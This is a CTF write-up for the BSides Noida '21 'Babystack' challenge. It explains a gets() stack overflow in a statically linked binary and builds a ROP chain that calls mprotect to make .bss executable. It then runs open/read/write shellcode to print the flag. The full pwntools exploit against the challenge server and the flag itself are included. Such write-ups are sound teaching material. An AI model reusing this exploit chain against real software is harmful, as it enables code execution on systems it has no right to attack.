# Babystack

Okay so this was a ROP based challenge in BSides Noida '21 CTF. At the time of the CTF, I wasn't really able to solve this challenge. However after trying again, I did get a solution.

Before we dive right in, let's check some preliminary conditions and permissions.
```babystack.out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=07e1b7ffbb8cbb81b3b714c0187e30dd5f6e2a0d, for GNU/Linux 3.2.0, not stripped```
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
As we can see, it is a 64 bit, statically linked file, with canary and nx enabled. Therefore, to inject a shellcode, we will need an executable stack which isn't possible at the current moment. Let's dive right in to know more.

```int __cdecl main(int argc, const char **argv, const char **envp)
{
  u32 inp[16]; // [rsp+0h] [rbp-40h] BYREF

  apply_seccomp(argc, argv, envp);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  gets(inp);
  return 0;
}
```

From the above decompiled binary, we see the obvious vulnerability "gets" and use of "seccomp" which prevents us from using syscalls other than read, write and open. 
Upon analyzing the binary further we can find mprotect function which basically changes perissions of the .bss section. This would ajorly help us in writing a shellcode as the .bss section already has permissions for read and write. Making it executable would help us injecting a shellcode. 
```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r--p	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out
0x00401000         0x0048d000         r-xp	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out
0x0048d000         0x004b5000         r--p	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out
0x004b5000         0x004b9000         r--p	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out
0x004b9000         0x004bc000         rw-p	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out          <-- .bss section with read and write permissions only. 
0x004bc000         0x004df000         rw-p	[heap]
0x00007ffff7ffb000 0x00007ffff7ffe000 r--p	[vvar]
0x00007ffff7ffe000 0x00007ffff7fff000 r-xp	[vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
```

As we can see, using mprotect(), if we change the permissions of the .bss section to "rwx", we can get our shellcode executed.

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r--p	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out
0x00401000         0x0048d000         r-xp	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out
0x0048d000         0x004b5000         r--p	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out
0x004b5000         0x004b9000         r--p	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out  
0x004b9000         0x004bc000         rwxp	/home/shravya/bi0s/pwn/bsidesCTF/babystack.out          <--- .bss section with read, write and executable permissions.
0x004bc000         0x004df000         rw-p	[heap]
0x00007ffff7ffb000 0x00007ffff7ffe000 r--p	[vvar]
0x00007ffff7ffe000 0x00007ffff7fff000 r-xp	[vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
```

To do that, we need to note a few things:
- buffer size is 0x40.
- Use an address in .bss section with "rw" permissions and make it executable as well.
- in order to write the shellcode in .bss section, we need to make use of gets() in .bss section.

Firstly, in order to change the permissions, we may do the following:
```
from pwn import *
context.arch = 'amd64'

#p = process('./babystack.out', level = "debug")
p = remote('34.136.150.230', 49156)
#gdb.attach(p)

pop_rax = p64(0x0000000000410da4)
pop_rdi = p64(0x00000000004018f4)
pop_rsi = p64(0x000000000040970e)
pop_rdx = p64(0x000000000040182f)

addr_rdi = p64(0x4b9000)
gets_addr = p64(0x40bd70)
mprotect = p64(0x0000000000443af0)

buf = 'a'*0x48

payload = buf
payload += pop_rdi
payload += addr_rdi
payload += gets_addr# to write shell code in .bss section
payload += pop_rdi + addr_rdi + pop_rsi + p64(0x3000) + pop_rdx + p64(0x7)
payload += mprotect# execute mprotect to make .bss section executable
payload += addr_rdi
```
This will make sure the .bss section has executable permissions. 

Since "seccomp" is used, we can only make use of read, write and open syscalls. Therefore we may write our shellcode as:
```
shell = shellcraft.open("flag.txt", 0, 0)
shell += shellcraft.read("rax", 0x4b9000, 200)
shell += shellcraft.write(1, 0x4b9000, 200)
```

Now all we need to do is send the payload and give the shell!

## Exploit:
Here's the complete exploit:

```
from pwn import *
context.arch = 'amd64'

#p = process('./babystack.out', level = "debug")
p = remote('34.136.150.230', 49156)
#gdb.attach(p)

pop_rax = p64(0x0000000000410da4)
pop_rdi = p64(0x00000000004018f4)
pop_rsi = p64(0x000000000040970e)
pop_rdx = p64(0x000000000040182f)

addr_rdi = p64(0x4b9000)
gets_addr = p64(0x40bd70)
mprotect = p64(0x0000000000443af0)

buf = 'a'*0x48

payload = buf
payload += pop_rdi
payload += addr_rdi
payload += gets_addr# to write shell code in .bss section
payload += pop_rdi + addr_rdi + pop_rsi + p64(0x3000) + pop_rdx + p64(0x7)
payload += mprotect# execute mprotect to make .bss section executable
payload += addr_rdi

shell = shellcraft.open("flag.txt", 0, 0)
shell += shellcraft.read("rax", 0x4b9000, 200)
shell += shellcraft.write(1, 0x4b9000, 200)

sleep(0.1)
p.sendline(payload)
sleep(0.1)
p.sendline(asm(shell))

p.interactive()
```

## Flag:
```BSNoida{y0u_4r3_4_b4by_pwn3r_n0w_C7A5}```

